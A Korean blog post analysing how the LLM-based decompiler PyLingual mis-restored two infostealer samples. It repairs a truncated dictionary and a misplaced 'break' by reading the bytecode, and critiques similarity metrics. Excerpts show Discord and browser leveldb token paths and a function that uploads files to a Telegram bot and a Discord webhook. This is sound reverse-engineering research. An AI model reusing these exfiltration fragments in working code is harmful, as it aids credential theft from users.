---
layout: post
title: "PyLingual 출력을 바이트코드로 복원하기"
date: 2026-10-09 09:00:00 +0900
category: 리버싱
author: WTCY
tags: [리버싱, 디컴파일, PyLingual, pyc, 바이트코드, Python, 논문재현, CCS2025]
excerpt: "ACM CCS 2025 Walking The Last Mile 과제. PyLingual이 복원한 .py가 그럴듯해 보여도 컴파일조차 안 된다. 잘린 딕셔너리와 루프 밖 break를 원본 .pyc 바이트코드로 되짚어 고치고, '토큰 일치율' 같은 지표가 왜 분석가를 속이는지 짚는다."
---

## 1. 시작하며

디컴파일러가 뱉은 코드는 대체로 멀쩡해 보인다. 들여쓰기도 맞고 변수명도 그럴듯하고, 주석까지 붙어 있으니 그냥 믿고 넘어가기 쉽다. 그런데 보기에 멀쩡한 코드가 실제로도 맞는지는 돌려 봐야 안다.

ACM CCS 2025 논문 [Walking The Last Mile](https://github.com/syssec-utd/CCS25-WalkingTheLastMile-Supplementary)이 공개한 과제를 하나 풀어 봤다. [PyLingual](https://pylingual.io)이라는 LLM 기반 디컴파일러가 복원한 `decomp.py`를 원본 `original.pyc`의 바이트코드와 맞대 보면서 틀린 곳을 찾아 고치는 과제다. 샘플 네 개 중에서 틀린 양상이 서로 가장 다른 두 개를 골랐다. 하나는 데이터가 중간에 뭉텅 잘려 나갔고, 다른 하나는 제어 흐름이 아예 엉뚱하게 복원됐다.

이 글에서 보려는 건 악성코드가 하는 일이 아니라 디컴파일러가 틀린 지점이다. 고친 `fixed.py`와 수정 근거는 [WTCYJ/ccs25-walking-last-mile-repair](https://github.com/WTCYJ/ccs25-walking-last-mile-repair)에 올려 뒀다.

## 2. 기준 잡기

세 샘플의 바이트코드 버전이 3.9, 3.10, 3.11로 제각각이라, 로컬 3.11 인터프리터의 `dis`로는 구버전을 직접 못 읽는다. 버전을 가리지 않는 `xdis`로 디스어셈블해 상수 테이블과 옵코드 스트림을 기준으로 삼았다.

```bash
pip install xdis
python -c "from xdis.disasm import disassemble_file; import sys; disassemble_file('original.pyc', sys.stdout)"
```

고친 다음에는 컴파일되는 선에서 멈추지 않았다. `fixed.py`를 다시 컴파일해 결과 코드 객체의 상수와 제어 흐름을 원본 `.pyc`와 되짚어 비교했다. 복원이 추측이 아니라 바이트코드와 같다는 걸 확인하기 위해서다.

## 3. 잘린 딕셔너리

첫 샘플 `dc_token`(바이트코드 3.9)에서 PyLingual은 브라우저 프로필 경로를 담은 딕셔너리를 중간에 끊어 버렸다. 출력 끝이 이렇게 매달려 있다.

```python
paths = {'Discord': self.roaming + '...leveldb\\', ...,
         'Chrome': self.appdata + '...leveldb\\', '
```

16번째 키 `Chrome` 뒤에 `, '`만 남고 끊긴다. 미묘한 버그가 아니라 파일이 파싱조차 안 되는 상태다.

```bash
python -c "import ast; ast.parse(open('decomp.py', encoding='utf-8').read())"
# SyntaxError: unterminated string literal (detected at line 42)
```

바이트코드를 보면 이 딕셔너리는 16개가 아니라 27개 항목을 `BUILD_CONST_KEY_MAP`으로 만든다. 전체 키 튜플이 코드 객체의 상수 하나로 통째로 들어 있고, 27개 값 문자열도 각각 상수로 남아 있다. 값마다 앞에 붙는 `LOAD_ATTR`이 `self.roaming`인지 `self.appdata`인지까지 옵코드에 찍혀 있어서(앞 6개가 `roaming`, 나머지 21개가 `appdata`) 복원에 추측이 끼어들 여지가 없다.

27개 중 PyLingual이 출력한 건 앞의 16개뿐이고, 뒤의 11개는 아무 표시 없이 빠졌다.

<svg viewBox="0 0 720 150" xmlns="http://www.w3.org/2000/svg" role="img" style="max-width:100%;height:auto;color:inherit">
  <style>
    .lbl{font:13px ui-sans-serif,system-ui,sans-serif;fill:currentColor}
    .sm{font:11px ui-monospace,monospace;fill:currentColor;opacity:.8}
    .kept{fill:currentColor;opacity:.12;stroke:currentColor;stroke-opacity:.5}
    .drop{fill:#e5484d;fill-opacity:.16;stroke:#e5484d;stroke-opacity:.9}
  </style>
  <text class="lbl" x="0" y="20">바이트코드의 paths 딕셔너리 — 27개 항목</text>
  <g>
    <g>
      <rect class="kept" x="0"   y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="26"  y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="52"  y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="78"  y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="104" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="130" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="156" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="182" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="208" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="234" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="260" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="286" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="312" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="338" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="364" y="35" width="24" height="24" rx="3"/>
      <rect class="kept" x="390" y="35" width="24" height="24" rx="3"/>
    </g>
    <g>
      <rect class="drop" x="420" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="446" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="472" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="498" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="524" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="550" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="576" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="602" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="628" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="654" y="35" width="24" height="24" rx="3"/>
      <rect class="drop" x="680" y="35" width="24" height="24" rx="3"/>
    </g>
    <line x1="414" y1="30" x2="414" y2="64" stroke="#e5484d" stroke-width="2" stroke-dasharray="3 3"/>
    <text class="sm" x="150" y="80">PyLingual이 살림 (1–16)</text>
    <text class="sm" x="470" y="80" fill="#e5484d">조용히 버림 (17–27)</text>
    <text class="sm" x="360" y="104">↑ 여기서 문자열이 끊겨 파일 전체가 SyntaxError</text>
  </g>
  <text class="lbl" x="0" y="138">일치율 지표는 왼쪽 16칸만 칭찬한다. 버려진 11칸은 점수에 드러나지 않는다.</text>
</svg>

누락된 11개를 복원한 뒤, 재컴파일한 `fixed.py`에서 `leveldb\`로 끝나는 경로 문자열 상수를 뽑아 원본 `.pyc`의 상수와 집합 비교했다. 양쪽 차집합이 모두 공집합, 27 대 27로 바이트 단위까지 같았다.

![복원한 fixed.py의 extract(). 16번째 Chrome에서 PyLingual 출력이 끝난 자리 아래로, 바이트코드에서 되살린 Chrome1~Iridium 열한 개가 이어진다](/assets/img/pylingual-repair/01-paths-fixed.jpg)

복원된 키는 사람이 추측할 법한 긴 이름이 아니라 `Chrome1`부터 `Chrome5`, `Microsoft Edge`, `Uran` 같은 짧은 식별자였다. 이게 실제 소스의 이름이라, 보기 좋게 다듬는 순간 복원이 아니라 창작이 된다.

PyLingual은 딕셔너리만 망가뜨린 게 아니라, 임포트보다 앞선 모듈 최상단에 `global pcuser`라는 줄을 `# inserted` 태그와 함께 끼워 넣었다. `global` 문은 바이트코드를 전혀 남기지 않으니 `.pyc`에서 그 존재를 되읽을 수 없고, 애초에 임포트 앞에 놓인 모듈 레벨 `global`은 사람이 쓰는 코드가 아니다. 그래서 지웠다. 반면 같은 태그가 붙은 함수 내부의 `global pcuser`는 정반대다. 그 함수 본문에 `STORE_GLOBAL pcuser`가 있어서, 소스에 선언이 없으면 애초에 그 옵코드가 나올 수 없다. 즉 반드시 있어야 하는 줄이다. 같은 `# inserted` 태그가 지워야 할 줄과 남겨야 할 줄에 똑같이 붙어 있는 셈이라, 디컴파일러가 스스로 단 표시는 믿을 게 못 된다.

전체 수정 내역은 [option02_dc_token/repair_notes.md](https://github.com/WTCYJ/ccs25-walking-last-mile-repair/blob/master/option02_dc_token/repair_notes.md)에, 고친 결과는 [fixed.py](https://github.com/WTCYJ/ccs25-walking-last-mile-repair/blob/master/option02_dc_token/fixed.py)에 있다.

## 4. 루프 밖의 break

두 번째 샘플 `ZARNET`(바이트코드 3.10)은 더 교묘하다. 문제의 함수는 이렇게 생겼다.

```python
def post_to(file):
    token = 'TELEGRAM TOKEN'
    chat_id = 'TELEGRAM CHATID'
    webhook_url = 'https://discord.com/api/webhooks/<redacted>'
    if token == 'TELEGRAM TOKEN':
        break                       # 루프가 없는데 break
    if chat_id == 'TELEGRAM CHATID':
        break                       # 역시 루프 밖
    post('https://api.telegram.org/bot' + token + '/sendDocument', data=..., files=...)
    if webhook_url == 'WEBHOOK URL':
        return
    post(webhook_url, files=...)
```

`post_to`에는 루프가 없으니 `break`는 말이 안 된다. 그런데 이 결함은 놓치기 쉽다. `ast.parse`가 통과시키기 때문이다.

```bash
python -c "import ast; ast.parse(open('decomp.py', encoding='utf-8').read())"
# (오류 없음 — 파싱은 멀쩡히 통과한다)

python -c "compile(open('decomp.py', encoding='utf-8').read(), 'x', 'exec')"
# SyntaxError: 'break' outside loop
```

루프 밖 `break`는 파싱이 아니라 그 뒤 심볼 테이블 분석 단계에서 잡힌다. 그래서 디컴파일러 출력을 `ast.parse`만으로 검증하는 흔한 파이프라인은 이 파일을 멀쩡하다고 통과시킨다. 검증은 반드시 `compile()`까지 가야 한다.

그럼 `break`의 정체는 뭘까. 바이트코드를 보면 두 비교문은 각각 Telegram 전송 블록 바로 뒤, 오프셋 68로 가는 조건부 `JUMP_FORWARD`다.

<svg viewBox="0 0 760 360" xmlns="http://www.w3.org/2000/svg" role="img" style="max-width:100%;height:auto;color:inherit">
  <style>
    .box{fill:currentColor;fill-opacity:.06;stroke:currentColor;stroke-opacity:.55}
    .skipbox{fill:#e5484d;fill-opacity:.05;stroke:#e5484d;stroke-opacity:.45;stroke-dasharray:5 4}
    .jumpbox{fill:currentColor;fill-opacity:.06;stroke:#e5484d;stroke-opacity:.7}
    .t{font:13px ui-sans-serif,system-ui,sans-serif;fill:currentColor}
    .tag{font:11px ui-monospace,monospace;fill:currentColor;opacity:.75}
    .rtag{font:12px ui-monospace,monospace;fill:#e5484d}
    .flow{stroke:currentColor;stroke-opacity:.45;stroke-width:1.5;fill:none}
    .skip{stroke:#e5484d;stroke-width:2;fill:none;stroke-linejoin:round}
  </style>
  <defs>
    <marker id="g" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto">
      <path d="M0,0 L6,3 L0,6 Z" fill="currentColor" opacity=".5"/>
    </marker>
    <marker id="r" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto">
      <path d="M0,0 L6,3 L0,6 Z" fill="#e5484d"/>
    </marker>
  </defs>

  <rect class="box"     x="24" y="20"  width="300" height="40" rx="6"/>
  <text class="t"       x="40" y="45">if token == 'TELEGRAM TOKEN'</text>
  <rect class="box"     x="24" y="82"  width="300" height="40" rx="6"/>
  <text class="t"       x="40" y="107">if chat_id == 'TELEGRAM CHATID'</text>
  <rect class="skipbox" x="24" y="144" width="300" height="40" rx="6"/>
  <text class="t"       x="40" y="169">Telegram 전송 post(...)</text>
  <rect class="jumpbox" x="24" y="228" width="300" height="40" rx="6"/>
  <text class="t"       x="40" y="253">if webhook_url == 'WEBHOOK URL'</text>
  <rect class="box"     x="24" y="290" width="300" height="40" rx="6"/>
  <text class="t"       x="40" y="315">웹훅 전송 post(...)</text>

  <path class="flow" d="M174,60 V82"   marker-end="url(#g)"/>
  <path class="flow" d="M174,122 V144" marker-end="url(#g)"/>
  <path class="flow" d="M174,184 V228" marker-end="url(#g)"/>
  <path class="flow" d="M174,268 V290" marker-end="url(#g)"/>

  <!-- two guards merge into one trunk that jumps to the webhook check -->
  <path class="skip" d="M324,40 H392"/>
  <path class="skip" d="M324,102 H392"/>
  <path class="skip" d="M392,40 V248 H328" marker-end="url(#r)"/>
  <circle cx="392" cy="40"  r="2.5" fill="#e5484d"/>
  <circle cx="392" cy="102" r="2.5" fill="#e5484d"/>

  <text class="tag"  x="40"  y="200">(건너뜀)</text>
  <text class="rtag" x="412" y="120">token 또는 chat_id 가</text>
  <text class="rtag" x="412" y="140">자리표시자이면</text>
  <text class="rtag" x="412" y="166">Telegram 전송을 건너뛰고</text>
  <text class="rtag" x="412" y="186">offset 68 (웹훅 검사)로 점프</text>
  <text class="tag"  x="412" y="252">← 점프가 도착하는 지점 = offset 68</text>
</svg>

정리하면 Telegram `post()`는 토큰과 챗아이디가 둘 다 자리표시자가 아닐 때만 실행되고, 어떤 경우든 제어는 웹훅 검사와 마지막 전송으로 흘러간다. 그러니까 `break`의 정체는 "Telegram 전송만 건너뛰고 나머지는 계속"이다. 이걸 바이트코드의 단락 평가까지 그대로 살리는 복원은 하나뿐이다.

```python
    if token != 'TELEGRAM TOKEN' and chat_id != 'TELEGRAM CHATID':
        post('https://api.telegram.org/bot' + token + '/sendDocument', data=..., files=...)
    if webhook_url == 'WEBHOOK URL':
        return
    post(webhook_url, files=...)
```

`and` 가드는 토큰이 자리표시자면 챗아이디를 아예 비교하지 않는다. 바이트코드가 첫 비교 직후 `JUMP_FORWARD`로 두 번째 비교를 건너뛰는 것과 정확히 같다. 재컴파일해 보면 `post_to`는 Telegram 전송을 가드하는 `!=` 비교 2개, 그다음 `== 'WEBHOOK URL'` 비교 1개와 전송 호출 2개로 나온다. 원본과 구조가 같다.

![고친 post_to. break 두 개를 단락 평가 and 가드로 바꿔, 두 값이 자리표시자가 아닐 때만 Telegram으로 보내고 그 뒤 웹훅 전송으로는 계속 간다](/assets/img/pylingual-repair/02-post-to-fixed.jpg)

여기서 `break`를 `return`으로 바꾸고 끝내고 싶어질 수 있다. 깔끔하게 컴파일되고, 세 줄 아래에 이미 `return`이 있으니 자연스러워 보인다. 그런데 틀렸다. `break`의 점프 목적지는 Telegram 블록 바로 뒤지 함수 끝이 아니다. `return`으로 바꾸면 마지막 웹훅 전송까지 건너뛰어 동작이 달라진다. 컴파일된다고 맞는 게 아니다. 점프 목적지를 바이트코드에서 직접 읽어야만 보이는 차이고, "일단 컴파일만 되게" 식으로 LLM에 맡기면 바로 이 함정에 빠진다.

전체 수정 내역은 [option04_zarnet/repair_notes.md](https://github.com/WTCYJ/ccs25-walking-last-mile-repair/blob/master/option04_zarnet/repair_notes.md)에, 고친 결과는 [fixed.py](https://github.com/WTCYJ/ccs25-walking-last-mile-repair/blob/master/option04_zarnet/fixed.py)에 있다.

## 5. AI 디컴파일러를 얼마나 믿을까

PyLingual은 논문과 자사 소개에서 높은 토큰 단위 일치율과 정확 일치율을 내세운다. 숫자 자체는 인상적이다. 그런데 이 두 샘플이 그 헤드라인 뒤의 간극을 그대로 드러낸다.

첫째, 출력이 애초에 유효한 파이썬이 아니다. 한 샘플은 파싱에서, 다른 샘플은 컴파일에서 터진다. 토큰 겹침 지표는 끊긴 문자열이나 루프 밖 `break`를 품은 파일에도 높은 점수를 줄 수 있지만, 그 파일은 분석가에게 쓸모가 없다. 실제 점수는 통과냐 실패냐 둘뿐이고, 둘 다 실패다.

둘째, 데이터가 조용히 사라진다. `dc_token`은 딕셔너리 항목 27개 중 11개를 아무 경고 없이 날렸다. 평균 유사도는 남은 16개만 반영할 뿐, 사라진 11개는 드러내지 않는다. 분석가에게 "경로 목록의 40%가 없다"는 건 점수 0.6짜리가 아니라 그냥 틀린 결과다.

셋째, 그럴듯한 오답을 유혹한다. `post_to`의 `return` 함정처럼, 컴파일만 통과시키는 수정은 동작을 바꿔 놓고도 멀쩡해 보인다.

## 참고 자료

- 복원 결과 저장소: [WTCYJ/ccs25-walking-last-mile-repair](https://github.com/WTCYJ/ccs25-walking-last-mile-repair)
- 논문 보조 저장소: [CCS25-WalkingTheLastMile-Supplementary](https://github.com/syssec-utd/CCS25-WalkingTheLastMile-Supplementary)
- [PyLingual](https://pylingual.io)
- 크로스버전 디스어셈블러: [xdis](https://github.com/rocky/python-xdis)
